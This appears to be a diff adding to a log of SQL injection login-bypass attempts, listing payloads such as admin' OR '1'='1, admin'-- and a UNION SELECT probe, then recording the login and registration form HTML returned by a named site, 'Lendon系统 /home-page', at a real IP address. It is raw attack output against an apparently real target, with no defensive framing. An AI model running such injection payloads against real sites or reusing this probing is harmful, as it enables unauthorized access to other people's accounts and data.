@@ -5,3 +5,17 @@ Payload: admin' OR '1'='1
 Payload: admin'--
 Payload: ' OR 1=1--
 Payload: admin' UNION SELECT NULL--
+
+[Lendon系统 /home-page]
+Payload: admin' OR '1'='1
+                <form id="form-login" method="post" action="https://14.225.241.201/home-page" data-request-flash="error">
+                <form id="frm-register" method="post" action="/home-page?type=register" data-request-flash="error,validate" data-request-validate>
+                    <p id="phone_error" class="text-red-500 text-xs pt-1"></p>
+Payload: admin'--
+                <form id="form-login" method="post" action="https://14.225.241.201/home-page" data-request-flash="error">
+                <form id="frm-register" method="post" action="/home-page?type=register" data-request-flash="error,validate" data-request-validate>
+                    <p id="phone_error" class="text-red-500 text-xs pt-1"></p>
+Payload: ' OR 1=1--
+                <form id="form-login" method="post" action="https://14.225.241.201/home-page" data-request-flash="error">
+                <form id="frm-register" method="post" action="/home-page?type=register" data-request-flash="error,validate" data-request-validate>
+                    <p id="phone_error" class="text-red-500 text-xs pt-1"></p>
